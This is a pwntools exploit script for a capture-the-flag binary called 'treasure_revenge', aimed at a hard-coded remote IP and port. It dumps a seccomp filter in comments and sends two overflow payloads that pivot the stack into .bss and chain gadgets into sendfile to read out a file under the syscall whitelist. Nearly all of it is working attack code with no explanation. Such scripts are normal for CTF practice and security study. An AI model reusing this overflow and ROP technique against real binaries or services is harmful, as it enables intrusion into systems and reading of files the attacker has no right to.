#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './treasure_revenge'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '143.198.215.203', 20038

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x4016e8
# break *0x40138f
# break *0x40144d

c
'''.format(**locals())

def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(d1, d2=0):
  io.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return io.recvuntil(d2,drop=True)

# =========================================================
#                         EXPLOITS
# =========================================================
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
#  0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
#  0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
#  0007: 0x15 0x04 0x00 0x00000003  if (A == close) goto 0012
#  0008: 0x15 0x03 0x00 0x0000000f  if (A == rt_sigreturn) goto 0012
#  0009: 0x15 0x02 0x00 0x00000028  if (A == sendfile) goto 0012
#  0010: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0012
#  0011: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0013
#  0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0013: 0x06 0x00 0x00 0x00000000  return KILL

def exploit():
    global io
    io = initialize()

    gad1 = 0x4012e8
    gad2 = 0x4012f5

    payload = flat({
        64: [
            elf.bss()+0x100,
            0x4016bd,
        ]
    })
    sla(b'?', payload)

    payload = flat({
        64-0x20: [
            0x3,
            0x0,
            0x200,
            0x1,
            0x404100-0x8,
            gad1,
            gad2,
            elf.plt['sendfile']
        ]
    })
    sla(b'?', payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
